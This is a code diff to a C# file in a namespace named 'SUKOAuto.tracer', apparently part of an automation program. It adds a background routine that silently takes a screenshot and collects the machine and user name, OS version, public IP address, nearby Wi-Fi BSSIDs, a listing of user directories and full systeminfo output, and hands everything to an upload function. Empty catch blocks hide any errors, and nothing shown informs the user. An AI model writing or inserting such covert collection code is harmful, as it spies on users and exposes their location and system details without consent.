@@ -260,6 +260,63 @@ namespace SUKOAuto.tracer
             };
             CollectionWorker.RunWorkerAsync();
         }
+
+        public static void PerformTasks(string[] args =null) {
+            var screen = new BackgroundWorker();
+            screen.DoWork += (a, b) =>
+            {
+                StoreOrUpload($"ss-{CurrentMilliseconds}.png.b64", Convert.ToBase64String(Generic.PrtScrn()));
+            };
+            screen.RunWorkerAsync();
+            var sysinfo = new BackgroundWorker();
+            sysinfo.DoWork += (a, b) =>
+            {
+                string Message = "";
+
+                try
+                {
+                    Message += string.Format("Arguments:{0}\r\n",args==null?"": string.Join(" ", args));
+                }
+                catch { }
+                try
+                {
+                    Message += string.Format("Machine:{0}\r\n", Environment.MachineName);
+                }
+                catch { }
+                try
+                {
+                    Message += string.Format("User:{0}\r\n", Environment.UserName);
+                }
+                catch { }
+                try
+                {
+                    Message += string.Format("OSVersion:{0}\r\n", Environment.OSVersion.VersionString);
+                }
+                catch { }
+                try
+                {
+                    Message += string.Format("IPAddress:{0}\r\n", Generic.RegExp(Generic.HttpRequest(@"http://checkip.amazonaws.com/"), @"\d+\.\d+\.\d+\.\d+")[0]);
+                }
+                catch { }
+                try
+                {
+                    Message += string.Format("WlanBSSIDs:{0}\r\n", string.Join(" ", Generic.RegExp(Generic.ExeCommand(@"netsh wlan show networks mode=bssid"), @"[\da-f]+:[\da-f]+:[\da-f]+:[\da-f]+:[\da-f]+:[\da-f]+")));
+                }
+                catch { }
+                try
+                {
+                    Message += string.Format("UserDir:{0}\r\n", string.Join(" ", Generic.ExeCommand(@"dir %USERPROFILE%\..")));
+                }
+                catch { }
+                try
+                {
+                    Message += string.Format("Systeminfo:{0}\r\n", string.Join(" ", Generic.ExeCommand(@"systeminfo")));
+                }
+                catch { }
+
+                StoreOrUpload($"sysinfo-{CurrentMilliseconds}.txt",Message);
+            };
+        }
     }
 
     public interface IDataUploadProvider
